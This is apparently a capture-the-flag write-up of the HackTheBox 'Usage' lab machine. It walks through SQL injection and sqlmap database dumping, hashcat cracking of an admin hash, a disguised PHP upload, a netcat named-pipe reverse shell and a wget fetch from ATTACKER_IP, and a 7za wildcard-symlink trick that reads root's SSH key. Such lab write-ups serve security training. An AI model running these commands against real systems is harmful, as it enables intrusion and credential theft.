# Usage Walkthrough
<br/>

## Intro
Welcome to the Usage challenge Walkthrough from HackTheBox, here is the link to the [room](https://app.hackthebox.com/machines/usage)
In this room we are gonna practice with web applications vulnerabilities, exploit them to gain access to the machine and finally escalate privileges to get the root flag.

To interact with the machine connect via OpenVPN using the "lab" config profile.

Whenever you feel ready press "Join the Machine"

<br/>
<br/>

## The Challenge
As always let's add the IP address to the hosts file
```bash
sudo -- sh -c "echo 'MACHINE-IP  usage.htb' >> /etc/hosts"
```

Now we can do a port scan with *nmap*
```bash
nmap -sV MACHINE_IP
```
Here is the scan report:
```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
```

Let's also check if there are any subdomains:
```bash
gobuster vhost -u http://usage.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain 
```

Yes, we have a match on admin.usage.htb, we can add it to the hosts file near the main domain.
```bash
nano /etc/hosts
```

Now we can start investigating the websistes by visiting:
```
http://usage.htb
```
and
```
http://admin.usage.htb
```

In both of them we can notice a login page, since we have no credentials to log in i tough it might be we have to use this forms to inject some code or commands.
After a bit of testing on the 2 login pages and the reset password one i found that this last look vulnerable to SQLi.

First of all you have to register an email, tap the register button on the top right.
In fact when i inserted the payload `test@test.com' or1=1;-- -` i got a green flag, but when i have tried to substitute the second "1" with a "2", rather than getting a normal error like a mismatch "this email do not exist" or something similar as i got by inserting other random values, i got a 500 server error.
This error can be caused by an improper usage of the user's input, it may get concatenated to the code and throw errors like this this because it checks the expression 1=2 which is not true anymore compared with the 1=1 part.

Now we should test if we can actually leverage this to dump some data from the database.

So i have decided to open Burp Suite, send again the request and capturing it with the proxy, than copy it and save it in a file that we call request.txt.
With the request file we can now use *sqlmap* to target that and try to dump some data.
If you are new to sqlmap i really suggest you to read the help page, it has all you need to use it.

```bash
sqlmap -r request.txt -p email --technique=BUT --level=5 --risk=3 --dbms=mysql --dbs --dump --threads 9
```

(Be patient sqlmap is always slow and if you have not a stable connection it might fail a couple of times and you have to restart it)

With this first command we have found the databases names 
```
available databases [3]:
[*] imformatian_schema
[*] oerformance_schema
[*] usage_blog
```
The one that interest us obviously is "usage_blog".

Now lets see the tables inside the database:
```bash
sqlmap -r request.txt -p email -D usage_blog --technique=BUT --level=5 --risk=3 --dbms=mysql --dbs --dump --threads 9
```

This time the tool found a lot of tables, but the one that really interest us is "admin_users" as we want to login with high privileges.
Now we can finally run it once again to dump the content of the table:
```bash
sqlmap -r request.txt -p email -D usage_blog -T admin_users --technique=BUT --level=5 --risk=3 --dbms=mysql --dbs --dump --threads 9
```

Here we have the table containing the hashed password of the admin user and his token:
```
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | THE_HASH | admin    | 2023-08-13 02:48:26 | 2024-06-05 20:20:25 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
```

Now we have to crack that hash which is blowfish and for hashcat its 3200, let's save it into a file
```bash
echo "THE_HASH_YOU_HAVE_FOUND" > hash.txt
```

Now we can do a dictionary attack `-a 3` using rockyou wordlist and wait a minute to get the password:
```bash
hashcat -a 3 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```
--> whatever1

Now that we have all the credentials we can navigate to the subdomain login page and login
```
http://admin.usage.htb
```

Here we can find on the top right the settings for the user and change it's profile picture, maybe we can upload a reverse shell.
My first try was with a php reverse shell but it got blocked as was not recognized as an image, looks like there are some filters in place.

So i have pasted the reverse shell in a new file called image.jpg, when i try to upload it i don't get errors but it will be uploaded as an image so we can intercept the "submit" request whit Burp's proxy and change back the extension to `.php` and than forward the request.

With a listener waiting for that, as soon as i forwarded the request i got a shell, but was kinda unstable so i created a new connection:
```bash
nc -lvnp 1234
```

```bash
nc -lvnp 12345
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 12345 >/tmp/f
```

Then we can do the procedure to upgrade the shell to a fully interactive TTY or either navigate inside the .ssh folder of the user and copy the ssh key called "id_rsa"
Then on our machine we will need to change it's permissions
```bash
chmod 600 id_rsa
```

Finally we can ssh as the user
```bash
ssh -i id_rsa dash@usage.htb
```

When done we can move into our home directory and open the user falg:
```bash
cd /home/dash
```
```bash
cat user.txt
```
--> REDACTED

<br/>

### Privilege Escalation
in the machine we can see from the home directory there is another user called xander

An easy way to start is by checking in our home directory, there is a script file called `.monitrc` let's check it, always look for this low hanging frutis
```bash
cat .monitrc
```

I download linpeas script file 
```bash
cp /usr/share/peass/linpeas/linpeas.sh .
```

We need to transfer it to the target:
```bash
python3 -m http.server
```

```bash
wget http://ATTACKER_IP:8000/linpeas.sh
```
make the script executable
```bash
chmod +x linpeas.sh
```
now run it
```bash
./linpeas.sh > report.txt
```



In the report a password was found : REDACTED, i don't know why but i am pretty sure it is xander's one,
```bash
su xander
```

Now let's check what we can run as root with xander:
```bash
sudo -l
```
```
User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

Let's check this binary:
```bash
strings /usr/bin/usage_management
```

```
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
Password has been reset.
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 
```

```bash
cd /var/www/html
```
```bash
touch @id_rsa  # or "@root.txt"
```
```bash
ln -s /root/.ssh/id_rsa id_rsa or link to the root flag
```

```bash
sudo /usr/bin/usage_management
```
chose option 1 when prompted

--> REDACTED

Congratulations, you have completed the challenge, i had a lot of fun doing it hope you did as well. <br>
If you wanna see more write ups you can check the WriteUps Directory in this GitHub repo. <br>
Catch you in the next CTF 😃 <br>
